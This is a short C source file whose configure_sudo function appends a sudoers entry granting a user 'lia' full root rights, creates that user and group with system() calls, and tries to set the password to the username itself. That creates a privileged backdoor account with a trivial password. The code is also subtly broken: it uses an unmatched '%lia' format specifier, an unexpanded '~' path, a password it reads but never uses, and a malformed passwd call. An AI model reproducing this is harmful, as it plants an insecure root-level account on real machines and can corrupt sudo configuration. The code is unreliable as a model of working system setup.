#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void configure_sudo() {
    FILE *fp = fopen("/etc/sudoers", "a");
    if (fp) {
        fprintf(fp, "\n%lia ALL=(ALL) ALL\n");
        fclose(fp);
    }

    // Create lia user/group
    system("groupadd lia");
    system("useradd -g lia lia");

    // Set password
    FILE *pass = fopen("~/.lia/sudo_password", "r");
    if (pass) {
        char password[5];
        fread(password, 1, 4, pass);
        fclose(pass);
        system("echo 'lia' | sudo -S passwd lia");
    }
}